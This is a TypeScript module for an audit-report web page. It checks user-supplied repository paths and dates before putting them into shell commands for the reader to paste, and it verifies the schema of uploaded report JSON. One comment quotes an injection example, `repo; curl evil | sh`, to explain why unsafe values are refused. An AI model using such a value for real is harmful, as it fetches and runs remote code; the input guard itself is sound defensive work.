// The audit views' pure logic, kept out of the components so it can be tested by `node --test` with no
// test framework, no JSDOM and no new dependency — `audit.test.ts` imports this file directly.
//
// That is not only convenience. Two of the three functions below carry a property that is not about
// appearance:
//
// * `compose` produces text a reader pastes into their own shell. A repository field is therefore a
//   command fragment, not display data, and `repo; curl evil | sh` typed into it would compose into a
//   line that runs both. It refuses to compose unless the value is a single shell-safe word.
// * `decodeReport` decides whether a file the reader chose is a report at all. Without the schema check
//   a JSON file that is not a report renders as a report with every section empty, and empty sections
//   read as "your submission has no problems".
//
// A guard with no test is a memory (`feedback_test_suite_over_memory`), and neither of these can be
// checked by the Python publish gate: the gate reads the built bundle's bytes, not its behaviour.

import type { AuditReport } from "./types";

/** `measured_true` -> `st-measured_true`, derived rather than mapped. `check_site_invariants.py`'s
 *  `audit_vocabularies_are_styled` arm asserts every member of `controls.json`'s status vocabulary has a
 *  matching rule in the served stylesheet, because a status with no rule renders as an unremarkable
 *  badge — and for `not_measured` the unremarkable reading is "nothing wrong here", which is the one
 *  thing it does not mean. */
export const statusClass = (s: string) => `st-${s.toLowerCase()}`;
export const obsClass = (o: string) => `o-${o.toLowerCase()}`;

/** A shell-safe single word: what a repository URL, a local path or a date can consist of and still be
 *  pasted into a command line unquoted. Deliberately narrow — `~`, `@`, `:` and `/` are in because
 *  `git@github.com:org/repo.git` and `~/src/repo` are the two shapes a reader will actually paste. */
const SAFE_WORD = /^[A-Za-z0-9@._:/~+-]+$/;
const ISO_DAY = /^\d{4}-\d{2}-\d{2}$/;

export const REPORT_SCHEMA = "grx-audit-report/1";

export type Composed = { lines: string[]; refusal: string | null; substituted: boolean };

/** Substitute the reader's values into the commands the payload published, or refuse and say why.
 *
 * The command templates are NOT written into this file: they come from `audit.json`, which the build
 * derived by running the two programs. A copy here would be a second source for what the tools are
 * called, and it would go stale the first time a flag was renamed — silently, because a wrong command on
 * a web page produces its error in somebody else's terminal.
 *
 * Refusing beats quoting. A reader who edits a quoted line afterwards silently loses the quoting, and
 * the refusal is the more useful answer anyway: a path with a semicolon in it is not a repository.
 */
export function compose(commands: string[], target: string, asOf: string): Composed {
  const t = target.trim();
  const d = asOf.trim();

  if (t && !SAFE_WORD.test(t)) {
    const bad = [...t].find((ch) => !SAFE_WORD.test(ch)) ?? " ";
    return {
      lines: commands,
      substituted: false,
      refusal:
        `Not composed: ${bad === " " ? "a space" : `the character ${JSON.stringify(bad)}`} is not ` +
        `something a repository URL or path contains, and pasting it into a shell command would ` +
        `change what that command does. The template is shown unmodified.`,
    };
  }
  if (t.startsWith("-")) {
    return {
      lines: commands,
      substituted: false,
      refusal:
        "Not composed: a value beginning with a hyphen would be read by the tool as an option rather " +
        "than as your repository. The template is shown unmodified.",
    };
  }
  if (d && !ISO_DAY.test(d)) {
    return {
      lines: commands,
      substituted: false,
      refusal:
        "Not composed: the report date must be an ISO day, `YYYY-MM-DD`. It is optional — leave it " +
        "empty and the flag is dropped entirely, which is the deterministic form.",
    };
  }

  const lines = commands.map((c) => {
    let out = t ? c.split("<your-repo>").join(t) : c;
    // The date is optional AND its absence is meaningful: `report.py` reads no clock, so omitting
    // `--as-of` is what makes the same submission produce a byte-identical report. An empty field
    // therefore removes the flag rather than substituting today, which no page here is entitled to know.
    out = d ? out.split("<YYYY-MM-DD>").join(d) : out.replace(/\s--as-of\s+<YYYY-MM-DD>/, "");
    return out;
  });
  return { lines, refusal: null, substituted: Boolean(t) };
}

/** Parse a report file the reader chose. Returns the report or a sentence naming what is wrong with it.
 *
 * The schema check is not decoration: `report.py` writes `schema: "grx-audit-report/1"`, and a file
 * without it is either from a different tool — an `inventory.json` is the likely mistake, since it sits
 * beside the report and has a similar shape — or from a version whose fields this page would render as
 * missing. Both are reported rather than rendered. */
export function decodeReport(text: string): { report: AuditReport } | { error: string } {
  let parsed: unknown;
  try {
    parsed = JSON.parse(text);
  } catch (e) {
    return { error: `Not JSON: ${e instanceof Error ? e.message : String(e)}` };
  }
  if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) {
    return { error: "The file parsed, but its top level is not a JSON object." };
  }
  const r = parsed as Partial<AuditReport>;
  if (r.schema !== REPORT_SCHEMA) {
    return {
      error:
        `This file declares schema ${JSON.stringify(r.schema ?? null)}, not ` +
        `${JSON.stringify(REPORT_SCHEMA)}. It may be an inventory.json — the parser's output — rather ` +
        `than a report.json, or a report from a different version of the tool. Nothing is rendered ` +
        `from it, because a report shape this page does not understand would show empty sections, and ` +
        `empty sections read as "nothing found".`,
    };
  }
  if (!Array.isArray(r.controls) || !Array.isArray(r.recommendations)) {
    return {
      error:
        "The file declares the right schema but carries no `controls` or `recommendations` array, so " +
        "there is nothing in it this page could render.",
    };
  }
  return { report: parsed as AuditReport };
}
